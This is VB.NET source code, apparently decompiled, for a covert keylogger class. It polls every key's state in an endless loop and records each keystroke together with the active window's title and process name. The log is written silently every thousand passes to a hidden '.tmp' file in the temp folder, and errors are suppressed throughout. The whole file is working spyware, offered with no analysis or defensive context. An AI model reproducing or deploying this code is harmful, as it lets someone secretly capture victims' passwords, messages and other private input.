Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace ClassLibrary1
    Public Class kl
        ' Methods
        Private Function AV() As String
            Try 
                Dim num As Integer
                Dim foregroundWindow As IntPtr = kl.GetForegroundWindow
                kl.GetWindowThreadProcessId(foregroundWindow, num)
                Dim processById As Process = Process.GetProcessById(num)
                If Not (((foregroundWindow.ToInt32 = Me.LastAV) And (Me.LastAS = processById.MainWindowTitle)) Or (processById.MainWindowTitle.Length = 0)) Then
                    Me.LastAV = foregroundWindow.ToInt32
                    Me.LastAS = processById.MainWindowTitle
                    Return String.Concat(New String() { ChrW(13) & ChrW(10) & ChrW(1), Me.HM, " ", processById.ProcessName, " ", Me.LastAS, ChrW(1) & ChrW(13) & ChrW(10) })
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
            Return ""
        End Function

        Private Function Fix(ByVal k As Keys) As String
            Dim str As String
            Dim shiftKeyDown As Boolean = Me.keyboard.ShiftKeyDown
            If Me.keyboard.CapsLock Then
                If shiftKeyDown Then
                    shiftKeyDown = False
                Else
                    shiftKeyDown = True
                End If
            End If
            Try 
                Select Case k
                    Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                        Return ("[" & k.ToString & "]")
                    Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                        Return ""
                    Case Keys.Space
                        Return " "
                    Case Keys.Enter, Keys.Enter
                        If Me.Logs.EndsWith("[ENTER]" & ChrW(13) & ChrW(10)) Then
                            Return ""
                        End If
                        Return "[ENTER]" & ChrW(13) & ChrW(10)
                    Case Keys.Tab
                        Return "[TAP]" & ChrW(13) & ChrW(10)
                End Select
                If shiftKeyDown Then
                    Return kl.VKCodeToUnicode((k)).ToUpper
                End If
                str = kl.VKCodeToUnicode((k))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                If shiftKeyDown Then
                    str = Strings.ChrW(CInt(k)).ToString.ToUpper
                    ProjectData.ClearProjectError
                    Return str
                End If
                str = Strings.ChrW(CInt(k)).ToString.ToLower
                ProjectData.ClearProjectError
            End Try
            Return str
        End Function

        <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
        End Function

        <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetForegroundWindow() As IntPtr
        End Function

        <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetKeyboardLayout(ByVal dwLayout As Integer) As Integer
        End Function

        <DllImport("user32.dll")> _
        Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetWindowThreadProcessId(ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
        End Function

        Private Function HM() As String
            Dim str As String
            Try 
                str = Me.Clock.LocalTime.ToString("yy/MM/dd")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "??/??/??"
                ProjectData.ClearProjectError
            End Try
            Return str
        End Function

        <DllImport("user32.dll")> _
        Private Shared Function MapVirtualKey(ByVal uCode As UInt32, ByVal uMapType As UInt32) As UInt32
        End Function

        <DllImport("user32.dll")> _
        Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInt32, ByVal wScanCode As UInt32, ByVal lpKeyState As Byte(), <Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInt32, ByVal dwhkl As IntPtr) As Integer
        End Function

        Private Shared Function VKCodeToUnicode(ByVal VKCode As UInt32) As String
            Try 
                Dim pwszBuff As New StringBuilder
                Dim lpKeyState As Byte() = New Byte(&HFF  - 1) {}
                If Not kl.GetKeyboardState(lpKeyState) Then
                    Return ""
                End If
                Dim wScanCode As UInt32 = kl.MapVirtualKey(VKCode, 0)
                Dim foregroundWindow As IntPtr = kl.GetForegroundWindow
                Dim lpdwProcessID As Integer = 0
                Dim keyboardLayout As Integer = (kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(foregroundWindow, lpdwProcessID)))
                kl.ToUnicodeEx(VKCode, wScanCode, lpKeyState, pwszBuff, 5, 0, keyboardLayout)
                Return pwszBuff.ToString
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
            Return DirectCast(CInt(VKCode), Keys).ToString
        End Function

        Public Sub WRK()
            Try 
                Me.Logs = File.ReadAllText(Me.LogsPath)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
            Try 
                Dim num As Integer = 0
                Do While True
                    num += 1
                    Dim vKey As Integer = 0
                    Do
                        If (kl.GetAsyncKeyState(vKey) = -32767) Then
                            Dim k As Keys = DirectCast(vKey, Keys)
                            Dim str As String = Me.Fix(k)
                            If (str.Length > 0) Then
                                Me.Logs = (Me.Logs & Me.AV)
                                Me.Logs = (Me.Logs & str)
                            End If
                            Me.lastKey = k
                        End If
                        vKey += 1
                    Loop While (vKey <= &HFF)
                    If (num = &H3E8) Then
                        num = 0
                        Dim num3 As Integer = &H5000
                        If (Me.Logs.Length > num3) Then
                            Me.Logs = Me.Logs.Remove(0, (Me.Logs.Length - num3))
                        End If
                        File.WriteAllText(Me.LogsPath, Me.Logs)
                    End If
                    Thread.Sleep(1)
                Loop
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError
            End Try
        End Sub


        ' Fields
        Public Clock As Clock = New Clock
        Private keyboard As Keyboard = New Keyboard
        Private LastAS As String
        Private LastAV As Integer
        Private lastKey As Keys = Keys.None
        Public Logs As String = ""
        Public LogsPath As String = (IO.Path.GetTempPath & ".tmp")
    End Class
End Namespace

